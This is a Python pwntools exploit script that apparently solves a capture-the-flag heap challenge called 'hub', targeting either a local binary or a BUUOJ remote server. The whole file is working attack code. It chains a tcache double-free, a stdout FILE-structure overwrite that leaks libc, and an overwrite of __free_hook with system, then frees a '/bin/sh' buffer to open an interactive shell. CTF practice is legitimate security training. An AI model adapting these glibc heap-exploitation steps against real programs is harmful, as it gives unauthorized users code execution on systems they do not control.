import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./hub')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./hub')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28892)
			elf=ELF('./hub')
			libc=ELF('../../x64libc/libc.so.6')

		def add(a):
			io.sendlineafter('>>','1')
			io.sendlineafter('stay?\n',str(a))

		def edit(a):
			io.sendlineafter('>>','3')
			io.sendafter('want?\n',a)

		def delete(a):
			io.sendlineafter('>>','2')
			io.sendlineafter('want?\n',str(a))

		def add1(a):
			io.sendline('1')
			io.sendlineafter('stay?',str(a))

		def edit1(a):
			io.sendline('3')
			io.sendafter('want?',a)

		def delete1(a):
			io.sendline('2')
			io.sendafter('want?',str(a))

		add(0x38)
		delete(0)
		delete(0)
		add(0x38)
		edit(p64(0x602020))
		add(0x38)
		add(0x38)
		edit('\x80')
		add1(0x38)
		edit1(p64(0xfbad1800))
		add1(0x28)
		delete1(0)
		delete1(0)
		add1(0x28)
		edit1(p64(0x602020))
		add1(0x28)
		add1(0x28)
		add1(0x28)
		edit1('\xc8')
		libc_base=u64(io.recv(8))-libc.sym['_IO_2_1_stdin_']
		libc.address=libc_base
		add1(0x18)
		delete1(0)
		delete1(0)
		add1(0x18)
		edit1(p64(libc.sym['__free_hook']))
		add1(0x18)
		add1(0x18)
		edit1(p64(libc.sym['system']))
		add1(0x60)
		edit1('/bin/sh\x00')
		delete1(0)








		#success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue